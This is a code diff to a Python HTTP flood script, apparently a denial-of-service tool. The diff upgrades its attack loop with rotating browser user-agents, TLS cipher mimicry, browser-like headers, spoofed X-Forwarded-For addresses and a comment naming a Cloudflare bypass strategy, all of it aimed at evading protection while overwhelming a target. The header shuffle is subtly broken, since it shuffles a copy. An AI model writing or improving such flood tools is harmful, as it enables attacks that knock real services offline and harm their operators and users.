@@ -10,8 +10,10 @@ import ssl
 # Professional Grade: Time/Volume Limits + RPS Control (Pacing)
 
 USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 ]
 
 def get_random_string(length=8):
@@ -30,7 +32,6 @@ def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shar
     target_port = int(port) if port else (443 if scheme == 'https' else 80)
     
     while True:
-        # GLOBAL LIMITS
         if limit_type == 'time' and time.time() >= end_time: break
         if limit_type == 'req' and shared_req.value >= limit_val: break
 
@@ -44,25 +45,39 @@ def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shar
                 ctx = ssl.create_default_context()
                 ctx.check_hostname = False
                 ctx.verify_mode = ssl.CERT_NONE
+                # Mimic modern cipher suites for TLS fingerprinting
+                ctx.set_ciphers('ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384')
                 s = ctx.wrap_socket(s, server_hostname=host if not host.replace('.','').isdigit() else None)
             
             s.connect((host, target_port))
-            s.settimeout(0.5)
+            s.settimeout(1)
 
-            # PRE-GENERATE PAYLOAD POOL (Speed Optimization)
+            # ADVANCED PAYLOAD POOL (Coudflare Bypass Strategy)
             payload_pool = []
-            for _ in range(1000):
-                p = f"{path}{'&' if '?' in path else '?'}{get_random_string(3)}={get_random_string(10)}"
-                h = (
-                    f"GET {p} HTTP/1.1\r\n"
-                    f"Host: {host}\r\n"
-                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-                    "Connection: keep-alive\r\n"
-                    "Accept-Encoding: gzip, deflate\r\n"
-                    f"X-V8-ID: {get_random_string(24)}\r\n"
-                    "Cache-Control: no-cache\r\n\r\n"
-                ).encode('utf-8')
-                payload_pool.append(h)
+            for _ in range(500):
+                ua = random.choice(USER_AGENTS)
+                rand_path = f"{path}{'&' if '?' in path else '?'}{get_random_string(3)}={get_random_string(10)}"
+                
+                # Randomized Header Order & Values
+                headers = [
+                    f"GET {rand_path} HTTP/1.1",
+                    f"Host: {host}",
+                    f"User-Agent: {ua}",
+                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+                    "Accept-Language: en-US,en;q=0.9",
+                    "Accept-Encoding: gzip, deflate, br",
+                    "Upgrade-Insecure-Requests: 1",
+                    "Sec-Fetch-Dest: document",
+                    "Sec-Fetch-Mode: navigate",
+                    "Sec-Fetch-Site: none",
+                    "Sec-Fetch-User: ?1",
+                    "Cache-Control: max-age=0",
+                    "Connection: keep-alive",
+                    f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+                ]
+                random.shuffle(headers[1:]) # Don't shuffle the request line
+                full_h = "\r\n".join(headers) + "\r\n\r\n"
+                payload_pool.append(full_h.encode('utf-8'))
 
             # EXTREME INTENSITY BURST LOOP (Fire & Forget)
             while True:
